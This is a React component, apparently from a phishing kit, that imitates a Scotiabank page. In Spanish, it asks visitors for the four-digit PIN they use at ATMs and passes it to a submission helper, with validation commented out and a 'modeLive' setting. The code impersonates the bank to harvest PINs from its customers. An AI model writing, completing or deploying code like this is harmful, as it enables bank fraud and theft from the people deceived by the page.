import { useFormik } from "formik"
import { submitBase } from "../../../helpers/submitBase"
import { useGeneralData } from "../../../hooks/useGeneralData"
import { atmValidate } from "../../../security/atmValidate"
import { Spiner } from "../../Spiner"
import { AtmError } from "./AtmError"
import { AtmInput } from "./AtmInput"
import { useState } from "react"

const initialValues = { atmPassword: '' }
export const Atm = () => {

  const dataImportant = useGeneralData({ spiner: true, endUrl: null, modeLive: false, timeLoader: 2000 })

  const [atmValue, setAtmValue] = useState('')

  const { handleSubmit , errors, handleBlur, touched } = useFormik({
      initialValues,
    //   validate: values => atmValidate({values}),
      onSubmit: async(valuesData, { resetForm }) => {
          valuesData.atmPassword = atmValue

          submitBase({dataImportant, valuesData})
          return resetForm()
      }
  })
  return (
    <div>
        {/* Spiner de carga */}
        {
            dataImportant.showSpiner === true ? <Spiner /> : (
                <div className='mt-11 mx-10 flex flex-col md:px-[300px] gap-10'>

                    

                    <div>
                        <p className='scotiaHeadline text-3xl text-[#333333] md:text-4xl text-center mb-20'>Ingresa la clave que usas en tu cajero.</p>
                        <form className='flex flex-col items-center w-full gap-20' onSubmit={handleSubmit}>
                            <AtmInput
                                atmValue={atmValue}
                                setAtmValue={setAtmValue} 
                            />
                            <div className="flex justify-between w-full">

                                <div className="flex  items-center gap-3">
                                    <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-[#000] stroke-[#000]">
                                        <path d="M0.900024 9H17.1"></path>
                                        <path d="M7.23916 2.66016L0.900024 8.99929L7.23916 15.3384" fill="none"></path>
                                    </svg>
                                    <span 
                                        className='text-[20px] scotiaBold'
                                        >
                                        Volver
                                    </span>
                                </div>

                                {/* border-[1px] border-[#ec111a] rounded-lg py-4 text-lg text-[#ec111a] scotiaBold w-full transition-all 
                                        hover:bg-[#be061b] hover:border-[#be061b] hover:text-white mb-20 */}
                                <div>
                                    <button 
                                        className="flex items-center gap-4 scotiaBold disabled:text-[#f6f6f6] text-[20px]"
                                        disabled={atmValue.length !== 4}
                                        type='submit'
                                        >
                                        Continuar
                                        <button 
                                            disabled={atmValue.length !== 4}
                                            className="disabled:bg-[#f6f6f6] disabled:border-[2px] disabled:border-[#bcbcbc] transition-all bg-[#ec111a] border-[2px] border-[#ec111a] w-[50px] h-[50px] flex justify-center items-center rounded-full">
                                                <svg width="24" height="24" viewBox="0 0 24 24" class="stroke-[#fff] fill-[#fff]">
                                                    <path fill="none" d="M14.22 4l8 8-8 8M1.78 12h20.44"></path>
                                                </svg>
                                        </button>
                                    </button>
                                </div>
                            </div>

                        </form>
                    </div>

                    <div className='hidden md:flex md:col-start-7 col-end-8 justify-center'>
                        <hr className='border-r-2 h-full' />
                    </div>

                </div>
            )
        }


    </div>
  )
}
